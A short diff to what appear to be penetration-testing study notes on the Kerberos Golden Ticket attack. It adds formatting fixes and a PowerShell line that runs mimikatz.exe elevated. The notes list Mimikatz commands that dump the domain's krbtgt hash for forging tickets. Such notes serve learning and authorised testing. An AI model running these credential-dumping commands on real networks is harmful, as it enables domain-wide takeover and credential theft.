@@ -7,16 +7,19 @@ Once we have the SID and krbtgt hash, we can generate a ticket
 - We can request access to any resource or system on the domain  
 - Golden tickets == complete access to every machine
 
-We can utilize Mimikatz toobtain the information necessary to perform this attack
+We can utilize Mimikatz to obtain the information necessary to perform this attack
 
-`mimikatz.exe`​
+`mimikatz.exe`
+
 `privilege::debug`​
+
 `lsadump::lsa /inject /name:krbtgt`​
 
 - dumps the information for the krbtgt account
 - need:
 	- krbtgt ntlm hash
 	- domain SID  
+Start-Process -FilePath "C:\Users\administrator\Downloads\mimikatz.exe" -Verb RunAs
 
 Results:
 ```
